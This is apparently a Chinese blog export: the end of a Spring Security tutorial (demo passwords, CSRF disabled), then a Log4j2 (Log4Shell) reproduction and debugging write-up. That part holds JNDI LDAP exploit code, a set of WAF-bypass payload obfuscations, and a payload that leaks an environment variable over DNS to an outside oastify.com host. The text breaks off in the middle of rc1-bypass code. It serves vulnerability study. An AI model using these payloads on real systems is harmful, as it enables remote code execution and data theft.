&#125;\n&#125;\n\n定制请求的授权规则\n@Override\nprotected void configure(HttpSecurity http) throws Exception &#123;\n   // 定制请求的授权规则\n   // 首页所有人可以访问\n   http.authorizeRequests().antMatchers(\"/\").permitAll()\n  .antMatchers(\"/level1/**\").hasRole(\"vip1\")\n  .antMatchers(\"/level2/**\").hasRole(\"vip2\")\n  .antMatchers(\"/level3/**\").hasRole(\"vip3\");\n&#125;\n\n测试一下：发现除了首页都进不去了！因为我们目前没有登录的角色，因为请求需要登录的角色拥有对应的权限才可以！这里的 hasRole 一般我们是需要和数据库连的，给数据库里面的用户一个权限的说明。\n在 configure() 方法中加入以下配置，开启自动配置的登录功能！\n// 开启自动配置的登录功能\n// /login 请求来到登录页\n// /login?error 重定向到这里表示登录失败\nhttp.formLogin();\n\n测试一下：发现，没有权限的时候，会跳转到登录的页面！最新版的 SpringSecurity 会导致你在没有配置 http.formLogin(); 的时候，就直接进行拦截，这就是为什么我说项目包是等到你用到的时候再去导的。\n\n\n查看刚才登录页的注释信息；\n我们可以定义认证规则，重写configure(AuthenticationManagerBuilder auth)方法\n//定义认证规则\n@Override\nprotected void configure(AuthenticationManagerBuilder auth) throws Exception &#123;\n \n   //在内存中定义，也可以在jdbc中去拿....\n   auth.inMemoryAuthentication()\n          .withUser(\"kuangshen\").password(\"123456\").roles(\"vip2\",\"vip3\")\n          .and()\n          .withUser(\"root\").password(\"123456\").roles(\"vip1\",\"vip2\",\"vip3\")\n          .and()\n          .withUser(\"guest\").password(\"123456\").roles(\"vip1\",\"vip2\");\n&#125;\n\n这里也是可以整合 mybatis 的。\n测试，我们可以使用这些账号登录进行测试！发现会报错！原因，我们要将前端传过来的密码进行某种方式加密，否则就无法登录，修改代码。\n//定义认证规则\n@Override\nprotected void configure(AuthenticationManagerBuilder auth) throws Exception &#123;\n   //在内存中定义，也可以在jdbc中去拿....\n   //Spring security 5.0中新增了多种加密方式，也改变了密码的格式。\n   //要想我们的项目还能够正常登陆，需要修改一下configure中的代码。我们要将前端传过来的密码进行某种方式加密\n   //spring security 官方推荐的是使用bcrypt加密方式。\n \n   auth.inMemoryAuthentication().passwordEncoder(new BCryptPasswordEncoder())\n          .withUser(\"kuangshen\").password(new BCryptPasswordEncoder().encode(\"123456\")).roles(\"vip2\",\"vip3\")\n          .and()\n          .withUser(\"root\").password(new BCryptPasswordEncoder().encode(\"123456\")).roles(\"vip1\",\"vip2\",\"vip3\")\n          .and()\n          .withUser(\"guest\").password(new BCryptPasswordEncoder().encode(\"123456\")).roles(\"vip1\",\"vip2\");\n&#125;\n\n测试，发现，登录成功，并且每个角色只能访问自己认证下的规则！搞定\n3. 权限控制和注销启自动配置的注销的功能\n//定制请求的授权规则\n@Override\nprotected void configure(HttpSecurity http) throws Exception &#123;\n   //....\n   //开启自动配置的注销的功能\n      // /logout 注销请求\n   http.logout();\n&#125;\n\n我们在前端，增加一个注销的按钮，index.html 导航栏中整合 thymeleaf，进行全栈开发。\n&lt;a class=\"item\" th:href=\"@&#123;/logout&#125;\">\n   &lt;i class=\"address card icon\">&lt;/i> 注销\n&lt;/a>\n\n我们可以去测试一下，登录成功后点击注销，发现注销完毕会跳转到登录页面！但是，我们想让他注销成功后，依旧可以跳转到首页，该怎么处理呢？\n\n一句话解决\n\n// .logoutSuccessUrl(\"/\"); 注销成功来到首页\nhttp.logout().logoutSuccessUrl(\"/\");\n\n我们现在又来一个需求：用户没有登录的时候，导航栏上只显示登录按钮，用户登录之后，导航栏可以显示登录的用户信息及注销按钮！还有就是，比如 kuangshen 这个用户，它只有 vip2，vip3 功能，那么登录则只显示这两个功能，而vip1 的功能菜单不显示！这个就是真实的网站情况了！该如何做呢？\n我们需要结合 thymeleaf 中的一些功能。不过讲道理，我觉得这些应该是 vue 来完成的吧？或者至少不应该整合 thymeleaf。\n毕竟是跟着狂神视频走的，就按照他那个写的。\n\n先导入 maven 依赖\n\n&lt;!-- https://mvnrepository.com/artifact/org.thymeleaf.extras/thymeleaf-extras-springsecurity4 -->\n&lt;dependency>\n   &lt;groupId>org.thymeleaf.extras&lt;/groupId>\n   &lt;artifactId>thymeleaf-extras-springsecurity5&lt;/artifactId>\n   &lt;version>3.0.4.RELEASE&lt;/version>\n&lt;/dependency>\n\n修改我们的前端页面，导入命名空间。\nxmlns:sec=\"http://www.thymeleaf.org/thymeleaf-extras-springsecurity5\"\n\n修改导航栏，增加认证判断\n&lt;!--登录注销-->\n&lt;div class=\"right menu\">\n\n   &lt;!--如果未登录-->\n   &lt;div sec:authorize=\"!isAuthenticated()\">\n       &lt;a class=\"item\" th:href=\"@&#123;/login&#125;\">\n           &lt;i class=\"address card icon\">&lt;/i> 登录\n       &lt;/a>\n   &lt;/div>\n\n   &lt;!--如果已登录-->\n   &lt;div sec:authorize=\"isAuthenticated()\">\n       &lt;a class=\"item\">\n           &lt;i class=\"address card icon\">&lt;/i>\n          用户名：&lt;span sec:authentication=\"principal.username\">&lt;/span>\n          角色：&lt;span sec:authentication=\"principal.authorities\">&lt;/span>\n       &lt;/a>\n   &lt;/div>\n\n   &lt;div sec:authorize=\"isAuthenticated()\">\n       &lt;a class=\"item\" th:href=\"@&#123;/logout&#125;\">\n           &lt;i class=\"address card icon\">&lt;/i> 注销\n       &lt;/a>\n   &lt;/div>\n&lt;/div>\n\n重启测试，我们可以登录试试看，登录成功后确实，显示了我们想要的页面；\n如果注销 404 了，就是因为它默认防止 csrf 跨站请求伪造，因为会产生安全问题，我们可以将请求改为 post 表单提交，或者在 spring security 中关闭 csrf 功能；我们试试：在配置中增加 http.csrf().disable();\nhttp.csrf().disable();//关闭csrf功能:跨站请求伪造,默认只能通过post方式提交logout请求\nhttp.logout().logoutSuccessUrl(\"/\");\n\n我们继续将下面的角色功能块认证完成\n&lt;!-- sec:authorize=\"hasRole('vip1')\" -->\n&lt;div class=\"column\" sec:authorize=\"hasRole('vip1')\">\n   &lt;div class=\"ui raised segment\">\n       &lt;div class=\"ui\">\n           &lt;div class=\"content\">\n               &lt;h5 class=\"content\">Level 1&lt;/h5>\n               &lt;hr>\n               &lt;div>&lt;a th:href=\"@&#123;/level1/1&#125;\">&lt;i class=\"bullhorn icon\">&lt;/i> Level-1-1&lt;/a>&lt;/div>\n               &lt;div>&lt;a th:href=\"@&#123;/level1/2&#125;\">&lt;i class=\"bullhorn icon\">&lt;/i> Level-1-2&lt;/a>&lt;/div>\n               &lt;div>&lt;a th:href=\"@&#123;/level1/3&#125;\">&lt;i class=\"bullhorn icon\">&lt;/i> Level-1-3&lt;/a>&lt;/div>\n           &lt;/div>\n       &lt;/div>\n   &lt;/div>\n&lt;/div>\n \n&lt;div class=\"column\" sec:authorize=\"hasRole('vip2')\">\n   &lt;div class=\"ui raised segment\">\n       &lt;div class=\"ui\">\n           &lt;div class=\"content\">\n               &lt;h5 class=\"content\">Level 2&lt;/h5>\n               &lt;hr>\n               &lt;div>&lt;a th:href=\"@&#123;/level2/1&#125;\">&lt;i class=\"bullhorn icon\">&lt;/i> Level-2-1&lt;/a>&lt;/div>\n               &lt;div>&lt;a th:href=\"@&#123;/level2/2&#125;\">&lt;i class=\"bullhorn icon\">&lt;/i> Level-2-2&lt;/a>&lt;/div>\n               &lt;div>&lt;a th:href=\"@&#123;/level2/3&#125;\">&lt;i class=\"bullhorn icon\">&lt;/i> Level-2-3&lt;/a>&lt;/div>\n           &lt;/div>\n       &lt;/div>\n   &lt;/div>\n&lt;/div>\n \n&lt;div class=\"column\" sec:authorize=\"hasRole('vip3')\">\n   &lt;div class=\"ui raised segment\">\n       &lt;div class=\"ui\">\n           &lt;div class=\"content\">\n               &lt;h5 class=\"content\">Level 3&lt;/h5>\n               &lt;hr>\n               &lt;div>&lt;a th:href=\"@&#123;/level3/1&#125;\">&lt;i class=\"bullhorn icon\">&lt;/i> Level-3-1&lt;/a>&lt;/div>\n               &lt;div>&lt;a th:href=\"@&#123;/level3/2&#125;\">&lt;i class=\"bullhorn icon\">&lt;/i> Level-3-2&lt;/a>&lt;/div>\n               &lt;div>&lt;a th:href=\"@&#123;/level3/3&#125;\">&lt;i class=\"bullhorn icon\">&lt;/i> Level-3-3&lt;/a>&lt;/div>\n           &lt;/div>\n       &lt;/div>\n   &lt;/div>\n&lt;/div>\n\n4. Remember Me 功能开启记住我功能\n//定制请求的授权规则\n@Override\nprotected void configure(HttpSecurity http) throws Exception &#123;\n//。。。。。。。。。。。\n   //记住我\n   http.rememberMe();\n&#125;\n\n我们再次启动项目测试一下，发现登录页多了一个记住我功能，我们登录之后关闭 浏览器，然后重新打开浏览器访问，发现用户依旧存在！\n思考：如何实现的呢？其实非常简单\n我们可以查看浏览器的 cookie\n\n\n我们点击注销的时候，可以发现，spring security 帮我们自动删除了这个 cookie\n\n\n5. 定制登录界面现在这个登录页面都是 spring security 默认的，怎么样可以使用我们自己写的 Login 界面呢？\n在刚才的登录页配置后面指定 loginpage\nhttp.formLogin().loginPage(\"/toLogin\");\n\n然后前端也需要指向我们自己定义的 login 请求\n&lt;a class=\"item\" th:href=\"@&#123;/toLogin&#125;\">\n   &lt;i class=\"address card icon\">&lt;/i> 登录\n&lt;/a>\n\n我们登录，需要将这些信息发送到哪里，我们也需要配置，login.html 配置提交请求及方式，方式必须为 POST\n&lt;form th:action=\"@&#123;/login&#125;\" method=\"post\">\n   &lt;div class=\"field\">\n       &lt;label>Username&lt;/label>\n       &lt;div class=\"ui left icon input\">\n           &lt;input type=\"text\" placeholder=\"Username\" name=\"username\">\n           &lt;i class=\"user icon\">&lt;/i>\n       &lt;/div>\n   &lt;/div>\n   &lt;div class=\"field\">\n       &lt;label>Password&lt;/label>\n       &lt;div class=\"ui left icon input\">\n           &lt;input type=\"password\" name=\"password\">\n           &lt;i class=\"lock icon\">&lt;/i>\n       &lt;/div>\n   &lt;/div>\n   &lt;input type=\"submit\" class=\"ui blue submit button\"/>\n&lt;/form>\n\n这个请求提交上来，我们还需要验证处理，怎么做呢？我们可以查看 formLogin() 方法的源码！我们配置接收登录的用户名和密码的参数\nhttp.formLogin()\n  .usernameParameter(\"username\")\n  .passwordParameter(\"password\")\n  .loginPage(\"/toLogin\")\n  .loginProcessingUrl(\"/login\"); // 登陆表单提交请求\n\n6. 完整配置页代码package springsecurity.config;\n \nimport org.springframework.security.config.annotation.authentication.builders.AuthenticationManagerBuilder;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\n \n@EnableWebSecurity // 开启WebSecurity模式\npublic class SecurityConfig extends WebSecurityConfigurerAdapter &#123;\n \n    @Override\n    protected void configure(HttpSecurity http) throws Exception &#123;\n        // 定制请求的授权规则\n        // 首页所有人可以访问\n        http.authorizeRequests().antMatchers(\"/\").permitAll()\n                .antMatchers(\"/level1/**\").hasRole(\"vip1\")\n                .antMatchers(\"/level2/**\").hasRole(\"vip2\")\n                .antMatchers(\"/level3/**\").hasRole(\"vip3\");\n \n        // 开启自动配置的登录功能\n        // /login 请求来到登录页\n        // /login?error 重定向到这里表示登录失败\n        http.formLogin().loginPage(\"/toLogin\").loginProcessingUrl(\"/login\");\n \n        //开启自动配置的注销的功能\n        // /logout 注销请求\n        http.csrf().disable();//关闭csrf功能:跨站请求伪造,默认只能通过post方式提交logout请求\n        http.logout().logoutSuccessUrl(\"/\");;\n \n        //记住我\n        http.rememberMe().rememberMeParameter(\"remember\");\n        //定制记住我的参数！\n \n    &#125;\n \n    //定义认证规则\n    @Override\n    protected void configure(AuthenticationManagerBuilder auth) throws Exception &#123;\n \n        //在内存中定义，也可以在jdbc中去拿....\n        //Spring security 5.0中新增了多种加密方式，也改变了密码的格式。\n        //要想我们的项目还能够正常登陆，需要修改一下configure中的代码。我们要将前端传过来的密码进行某种方式加密\n        //spring security 官方推荐的是使用bcrypt加密方式。\n        auth.inMemoryAuthentication().passwordEncoder(new BCryptPasswordEncoder())\n                .withUser(\"kuangshen\").password(new BCryptPasswordEncoder().encode(\"123456\")).roles(\"vip2\",\"vip3\")\n                .and()\n                .withUser(\"root\").password(new BCryptPasswordEncoder().encode(\"123456\")).roles(\"vip1\",\"vip2\",\"vip3\")\n                .and()\n                .withUser(\"guest\").password(new BCryptPasswordEncoder().encode(\"123456\")).roles(\"vip1\",\"vip2\");\n    &#125;\n&#125;\n\n0x06 参考资料SpringBoot整合框架 – JohnFrod’s Blog\n【狂神说Java】SpringBoot最新教程IDEA版通俗易懂\n","categories":["Java 开发"],"tags":["Java 开发"]},{"title":"Log4j2复现","url":"/2022/08/09/Log4j2%E5%A4%8D%E7%8E%B0/","content":"\n\n\n看到网上烂的文章还是有一部分，决定自己写一篇，深入理解一下 log4j2 的 RCE\n\n一些个靶场\n掌控安全\n首页 - vulfocus\nlog4shell-vulnerable-app\nLog4j2 复现0x01 前言\n忍不住想先学一学 Log4j2 的漏洞，结果上网一查资料，看到一些资料感觉写的不太清楚，于是自己提笔来写一篇 ~\n\n0x02 Log4j2 基础开发学习环境\njdk8u65\n\n网上有很多说 jdk8u191 之后就不行了，其实不是的；高版本 jdk 是有绕过手段的。\n\nLog4j2 2.14.1\nCC 3.2.1 (最好是)\n\nDemo 实现\n开发的话，其实也不难，因为作为组件的话，如果要实现组件功能的话实现配置即可。\n\n这里主要是简单走一遍开发流程，让大家了解一下 log4j2 有什么用。\nlog4j 和 log4j2 都是日志管理工具，相比于 log4j，log4j2 一步步变得越来越主流，现在市场很很多的项目都是 slf4j + log4j2\n我们这里就简单看一个 Log4j2 的小 demo，并不复杂。\n\n首先要实现 Log4j2 的组件应用，先是 Pom.xml\n\n&lt;dependency>  \n &lt;groupId>org.apache.logging.log4j&lt;/groupId>  \n &lt;artifactId>log4j-core&lt;/artifactId>  \n &lt;version>2.14.1&lt;/version>  \n&lt;/dependency>   \n&lt;dependency>  \n &lt;groupId>org.apache.logging.log4j&lt;/groupId>  \n &lt;artifactId>log4j-api&lt;/artifactId>  \n &lt;version>2.14.1&lt;/version>  \n&lt;/dependency>  \n&lt;dependency>  \n &lt;groupId>junit&lt;/groupId>  \n &lt;artifactId>junit&lt;/artifactId>  \n &lt;version>4.12&lt;/version>  \n &lt;scope>test&lt;/scope>  \n&lt;/dependency>\n\n然后网上有讲很多教程，说 log4j2 的一些实现方式，什么 xml，yaml，properties 等很多方式。\n这里，我们简单用 xml 的方式来实现，文件如下\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?>  \n\n&lt;configuration status=\"info\">    \n &lt;Properties>  \n &lt;Property name=\"pattern1\">[%-5p] %d %c - %m%n&lt;/Property>  \n &lt;Property name=\"pattern2\">  \n =========================================%n 日志级别：%p%n 日志时间：%d%n 所属类名：%c%n 所属线程：%t%n 日志信息：%m%n  \n        &lt;/Property>  \n &lt;Property name=\"filePath\">logs/myLog.log&lt;/Property>  \n &lt;/Properties>  \n &lt;appenders> &lt;Console name=\"Console\" target=\"SYSTEM_OUT\">  \n &lt;PatternLayout pattern=\"$&#123;pattern1&#125;\"/>  \n &lt;/Console> &lt;RollingFile name=\"RollingFile\" fileName=\"$&#123;filePath&#125;\"  \n filePattern=\"logs/$$&#123;date:yyyy-MM&#125;/app-%d&#123;MM-dd-yyyy&#125;-%i.log.gz\">  \n &lt;PatternLayout pattern=\"$&#123;pattern2&#125;\"/>  \n &lt;SizeBasedTriggeringPolicy size=\"5 MB\"/>  \n &lt;/RollingFile> \n\t&lt;/appenders> \n\t&lt;loggers> \n\t\t&lt;root level=\"info\">  \n &lt;appender-ref ref=\"Console\"/>  \n &lt;appender-ref ref=\"RollingFile\"/>  \n &lt;/root> \n&lt;/loggers>\n&lt;/configuration>\n\n然后写一个 demo\nimport org.apache.logging.log4j.LogManager;  \nimport org.apache.logging.log4j.Logger;  \n  \nimport java.util.function.LongFunction;  \n  \npublic class Log4j2Test01 &#123;  \n    public static void main( String[] args )  \n    &#123;  \n        Logger logger = LogManager.getLogger(LongFunction.class);  \n logger.trace(\"trace level\");  \n logger.debug(\"debug level\");  \n logger.info(\"info level\");  \n logger.warn(\"warn level\");  \n logger.error(\"error level\");  \n logger.fatal(\"fatal level\");  \n &#125;  \n&#125;\n\n\n跑起来是这个样子\n\n\n\n实际开发场景现在的代码是我们封装的一个行为，一般日志文件还是需要输出的。然后实际应用的话，是这样的。\n比如我从数据库获取到了一个 username 为 “Drunkbaby”，我要把它登录进来的信息打印到日志里面，这个路径一般有一个 &#x2F;logs 的文件夹的。\n这时候就是我们的实际应用场景，跑一下看看。\nimport org.apache.logging.log4j.LogManager;  \nimport org.apache.logging.log4j.Logger;  \n  \nimport java.util.function.LongFunction;  \n  \npublic class RealEnv &#123;  \n    public static void main(String[] args) &#123;  \n        Logger logger = LogManager.getLogger(LongFunction.class);  \n  \n String username = \"Drunkbaby\";  \n if (username != null) &#123;  \n            logger.info(\"User &#123;&#125; login in!\", username);  \n &#125;  \n        else &#123;  \n            logger.error(\"User &#123;&#125; not exists\", username);  \n &#125;  \n    &#125;  \n&#125;\n\nRun 一下\n\n\n当然实际场景里面肯定不会是判断 null，肯定是和 mybatis 数据库这种结合起来使用的，具体的 demo 我就不写了，仅仅知道开发流程就可以了。\n0x03 Log4j2 漏洞分析影响版本2.x &lt;&#x3D; log4j &lt;&#x3D; 2.15.0-rc1\n漏洞原理我们可以看到在 logger.info(&quot;User &#123;&#125; login in!&quot;, username); 的这个地方，实际上 ———— username 这个参数是可控的。我输入 username 确实是用户可控的。\n那么这里，我们尝试输入一下其他的呢？\n我们将 username 修改为 String username = &quot;$&#123;java:os&#125;&quot;;，再跑一下看看。\n\n\n这里并不是打印出了 “Hello, $java:os”，而是打印出了我们操作系统的一些信息。这里的设计看上去就有非常大的问题，官方文档的意思是这是 log4j2 自带的一个功能。\n\n\n其实如果按照官网上面的那几个 api 来看，其实不太严重，最多也就是日志与我们输入对不上而已，并不是会引起大的安全漏洞。\n\n真正的问题是，这里的 lookup 它是基于 jndi 的，而 jndi 里面我们早在之前说过直接调用 lookup() 是会存在漏洞的。\n\njndi 可以看我这篇文章。Java反序列化之JNDI学习 | 芜风 (drun1baby.github.io)\n0x04 漏洞复现与 EXP\n在知道漏洞原理的情况下，我们可以直接写 EXP 了，EXP 非常简单，就一句话\n\nimport org.apache.logging.log4j.LogManager;  \nimport org.apache.logging.log4j.Logger;  \n  \nimport java.util.function.LongFunction;  \n  \npublic class log4j2EXP &#123;  \n    public static void main(String[] args) &#123;  \n        Logger logger = LogManager.getLogger(LongFunction.class);  \n  \n String username = \"$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;\";  \n  \n logger.info(\"User &#123;&#125; login in!\", username);  \n &#125;  \n&#125;\n\n然后要开启 RMIServer，因为之前有代码，这里就不放了。\n成功\n\n\n0x05 调试分析分析\n这里我觉得还是会走到原生的 RMI 里面的 lookup 方法去的。\n\n\n调试会有点难度，而且会有很多遍的各种调用，因为日志第一行是 &#123;pattern1&#125; 还有 &#123;pattern2&#125;；后续还有日期的那些信息，到最后才是我们的输入。所以要把断点找好，一直 f9 比较节省时间。\n\n不要直接调试，我们下个断点在 PatternLayout 这个类下的 toSerializable() 方法。因为前面的调试很多都是在转来转去，这样太浪费时间了。\n\n\n往下走，先是一个循环，遍历 formatters 一段一段的拼接输出的内容，不是很重要。\n两个传进去进行处理的变量，一个是 event，也就是我们 log4j2 需要来进行日志打印的内容；另外一个 buffer，我们会把打印出来的东西写进 buffer。\n\n\n跟进 format() 方法，这个 format() 方法师傅们可以把它当作是处理字符串的一个方法，具体如何处理是根据具体情况重写的。当时自己学习的时候就一直纠结的这个，其实没必要。\n因为这是一个循环来遍历 formatters 的，中间会做很多数据处理的工作，这都不重要，但是有一个地方特别重要，我这里当 i &#x3D; 7 的时候进入到了另外的一个 format 处理方法，如图。\n\n\n\n\n其实 event 还是同一个，这里循环到底是什么逻辑我也搞不清楚，如果有了解的师傅还请指点一下 ~\n\n当我们进到这个 format() 方法里面之后，先判断是否是 Log4j2 的 lookups 功能。这里我们是 lookups 功能，所以可以继续往下走。\n\n\n\n继续往下走，会遍历 workingBuilder 来进行判断；如果 workingBuilder 中存在 $&#123; ，那么就会取出从 $ 开始知道最后的字符串，这一步(这里的日志其实有很长，我们看 logs 文件夹是可以看到的，是一条条读取出来的)\n\n\nworkingBuilder 的内容如下，其实结构也比较清晰方法名，日志级别，当前类名，然后就是我们的 payload\n\n\n所以上图的 value 就是我们输入的 payload $&#123;jndi:ldap://127.0.0.1:1389/Calc&#125;\n跟进 replace() 方法，replace() 方法里面调用了 substitute() 方法\n\n\n跟进之后 f7 进入到这里\n\n\n继续往下走，直到这个 while 循环里面，在 while 循环中，会对字符进行逐字匹配 $&#123;\n\n\n然后进行循环读取，知道读取到 } 并获取其坐标，然后将 ${} 中间的内容取出来，然后又会调用 this.subtitute 来处理。\n这里会多次进入这个过程，说真的挺头疼的，不用管其他流程，我们就关注这个 $&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125; 的值即可\n\n\n再次运行 subtitue 的时候由于我们已没有 ${ } 所以就直接来到下面，将 varName 作为变量传入了 resolveVariable 函数\n\n\nvarName 就是为 ${} 中的值\n\n\n可以猜测resolver解析时支持的关键词有[date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j]，而我们这里利用的jndi:xxx后续就会用到JndiLookup这个解析器\n\n\n\n\n这里我们看到 resolveVariable() 方法里面是调用了 lookup() 方法，这个 lookup() 方法也就是 jndi 里面原生的方法，在我们让 jndi 去调用 ldap 服务的时候，是调用原生的 lookup() 方法的，是存在漏洞的。\n\n\n\n\n再可以往里跟一下\n\n\n\n再往下走就是 JNDI 常规的注入了，分析过程到此结束。\n\n小结调试\n先判断内容中是否有$&#123;&#125;，然后截取$&#123;&#125;中的内容，得到我们的恶意payload jndi:xxx\n后使用:分割payload，通过前缀来判断使用何种解析器去lookup\n支持的前缀包括 date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，后续我们的绕过可能会用到这些。\n\n0x06 针对 WAF 的常规绕过\n出发点是基于很多 WAF 检测是否存在 jndi: 等关键词进行判断，下面我们讲一讲绕过手法。\n\n 根据官方文档中的描述，如果参数未定义，那么 :- 后面的就是默认值，通俗的来说就是默认值\n\n\n1. 利用分隔符和多个 $&#123;&#125; 绕过\n例如这个 payload\n\nlogg.info(\"$&#123;$&#123;::-J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;\");\n\n2. 通过 lower 和 upper 绕过这一点，因为我们之前说允许的字段是这一些 date, java, marker, ctx, lower, upper, jndi, main, jvmrunargs, sys, env, log4j，其中就有 lower 和 upper\n同时也可以利用 lower 和 upper 来进行 bypass 关键字\nlogg.info(\"$&#123;$&#123;lower:J&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;\");\nlogg.info(\"$&#123;$&#123;upper:j&#125;ndi:ldap://127.0.0.1:1389/Calc&#125;\");\n....\n\n同时也可以利用一些特殊字符的大小写转化的问题\n\nı &#x3D;&gt; upper &#x3D;&gt; i (Java 中测试可行)\nſ &#x3D;&gt; upper &#x3D;&gt; S (Java 中测试可行)\nİ &#x3D;&gt; upper &#x3D;&gt; i (Java 中测试不可行)\nK &#x3D;&gt; upper &#x3D;&gt; k (Java 中测试不可行)\n\nlogg.error(\"$&#123;jnd$&#123;upper:ı&#125;:ldap://127.0.0.1:1389/Calc&#125;\");\n...\n\n由于这玩意儿测试过程中随便插都行，现在数据传输很多都是 json 形式，所以在 json 中我们也可以进行尝试\n像 Jackson 和 fastjson 又有 unicode 和 hex 的编码特性，所以就可以尝试编码绕过\n&#123;\"key\":\"\\u0024\\u007b\"&#125;\n&#123;\"key\":\"\\x24\\u007b\"&#125;\n\n3. 总结一些 payload\n原始payload\n\n\"$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;\";\n\n对应的绕过手段\n$&#123;$&#123;a:-j&#125;ndi:ldap://127.0.0.1:1234/ExportObject&#125;;\n  \n$&#123;$&#123;a:-j&#125;n$&#123;::-d&#125;i:ldap://127.0.0.1:1234/ExportObject&#125;\";\n  \n$&#123;$&#123;lower:jn&#125;di:ldap://127.0.0.1:1234/ExportObject&#125;\";\n  \n$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;di:ldap://127.0.0.1:1234/ExportObject&#125;\";\n  \n$&#123;$&#123;lower:$&#123;upper:jn&#125;&#125;$&#123;::-di&#125;:ldap://127.0.0.1:1234/ExportObject&#125;\";\n\n\n4. 奇淫技巧\n主要是读取敏感信息，GoogleCTF2022 的 log4j2 的题目中，有一种非预期的方式就是通过这种方式打的\n\n刚才分析了其他解析器功效，通过sys和env协议，结合jndi可以读取到一些环境变量和系统变量，特定情况下可能可以读取到系统密码\n举个例子\n$&#123;jndi:ldap://$&#123;env:LOGNAME&#125;.1hj2a0litb8gvybwuy1m16vj8ae02p.oastify.com&#125;\n\n\n\n我这里本地利用失败了，还有浅蓝师傅提出来的读取 classpath 的敏感信息的利用方式 ———— http://wjlshare.com/archives/1677\n0x07 Log4j2 2.15.0 漏洞修复与绕过\n说实话，挺鸡肋的，而且受操作系统影响，Windows 无法复现成功，师傅们可以看一下思路，不用跟着复现。\n\n1. 初窥 log4j 2.15.0 版本的修复官方给出了 CVE 编号和补丁，升级到了 2.15.0 之后默认不开启 JNDI Lookup\n\n\n漏洞修复主要是在 JndiManager#lookup 中增加了代码，因为最终的触发点就是这里，我们可以先跑一下之前的 2.14.1 里面攻击的 EXP\nimport org.apache.logging.log4j.LogManager;  \nimport org.apache.logging.log4j.Logger;  \nimport org.apache.logging.log4j.core.layout.PatternLayout;  \n  \nimport java.util.function.LongFunction;  \n  \npublic class OriginalEXP &#123;  \n    public static void main(String[] args) &#123;  \n        Logger logger = LogManager.getLogger(LongFunction.class);  \n  \n String username = \"$&#123;jndi:ldap://127.0.0.1:1234/ExportObject&#125;\";  \n  \n logger.error(\"User &#123;&#125; login in!\", username);  \n &#125;  \n&#125;\n\n如果这时候运行的话我们会直接把一整个 username 直接就装进去了，并不执行任何命令，也就是说这个语句是正常走的，但是没有走到 lookup 里面进去，没有实现到我们想要的效果。\n后续的分析会把 2.14.1 和 2.15.0 两个版本对照起来调试，要不然调试这一块确实很难。\n我一开始是把断点打在 StrSubstitutor 这个类下的 resolver.lookup 那里，但是发现一直走不进去，所以先把断点打在 PatternLayout#toSerializable 这里。\n左边是 2.14.1 版本的，右边是 2.15.0 版本的，开始调试。\n\n因为我前文说过，toSerializable 这里会读取日志的全部部分，所以一开始是什么 [ERROR] 那些的。所以我们要走到读取 payload 的地方。如图所示，2.14.1 类是 MessagePatternConverter，2.15.0 是 MessagePatternConverter.SimplePatternConverter\n\n\n\n这里 2.14.1 的版本会进行 $&#123;&#125; 的判断，而 2.15.0 的版本会直接把它 toAppendTo 进去。注意！这是同一个类的 format 方法，由此可见，此处是 2.15.0 版本的修复点之一。\n\n\n\n2.15.0 版本的 log4j 包还在 JndiManager#lookup 中增加了代码，不过我们现在得先走到那里面进去再去分析。现在应该想办法走进 JndiManager#lookup。\n\n后续听 4ra1n 师傅，也就是许少说，Windows 上无法复现成功，需要 mac 才可以，这里绕过我觉得可以看一个思路，但是实际利用上还是很鸡肋。\n2. log4j rc1 bypass\n按照我们上面所分析的，难道就没有办法进入到 lookup() 进行攻击了吗？\n\n其实不是这样的，我们在 MssagePatternConverter 这个类里面找之前 2.14.1 版本中的调用语句：config.getStrSubstitutor().replace(event, value)。结果是找到一个非常非常类似的语句，位置如图所示\n\n\n点进去看 replaceIn() 方法，它所属的类是 StrSubstitutor，这和我们在 2.14.1 里面分析的是一样的过程。\n\n\n那么回来看调用 replaceIn() 方法的 format() 方法是隶属于 LookupMessagePatternConverter 这个类的，而这个类继承了 MessagePatternConverter；如果我们要进到 LookupMessagePatternConverter 这个类里面去，需要满足前文提到的 Converter 为 LookupMessagePatternConverter 这个类。\n但是怎么样才能让 converter 的类变成 LookupMessagePatternConverter，而不是 SimpleMessagePatternConverter 呢？\n（一开始这里自己分析不下去了，看天下大木头师傅的文章才知道是怎么解决的）\n在 newInstance() 方法中会调用 loadLookups() 这个方法，在 loadLookups() 方法中会根据 if (LOOKUPS.equalsIgnoreCase(option)) 的结果来判断是哪一个 Converter，我们可以在这里打个断点。发现是要满足两个条件才可以，如图。\n\n\n在经过多次尝试之后，发现其实限制因素其实都是需要我们手动去修改的，在实际渗透的时候不可能会遇到这种情况，如图。\n\n\n\n所以这也是补丁绕过比较鸡肋的地方\n\n为了分析绕过，我们只能手动配置了。。。\n手动开启的 lookup 在 resources 中添加 log4j2.xml 文件\n&lt;configuration status=\"OFF\" monitorInterval=\"30\">\n    &lt;appenders>\n        &lt;console name=\"CONSOLE-APPENDER\" target=\"SYSTEM_OUT\">\n            &lt;PatternLayout pattern=\"%m&#123;lookups&#125;%n\"/>\n        &lt;/console>\n    &lt;/appenders>\n\n    &lt;loggers>\n        &lt;root level=\"error\">\n            &lt;appender-ref ref=\"CONSOLE-APPENDER\"/>\n        &lt;/root>\n    &lt;/loggers>\n&lt;/configuration>\n\n\n所以我们的 EXP 应该是这样的。\n\nimport org.apache.logging.log4j.LogManager;  \nimport org.apache.logging.log4j.Logger;  \nimport org.apache.logging.log4j.core.LogEvent;  \nimport org.apache.logging.log4j.core.config.Configuration;  \nimport org.apache.logging.log4j.core.config.DefaultConfiguration;  \nimport org.apache.logging.log4j.core.impl.MutableLogEvent;  \nimport org.apache.logging.log4j.core.pattern.MessagePatternConverter;  \n  \nimport java.util.function.LongFunction;  \n  \n// 绕过 rc1 的 EXPpublic class BypassRc1EXP &#123;  \n    public static void main(String[] args) &#123;  \n        Logger 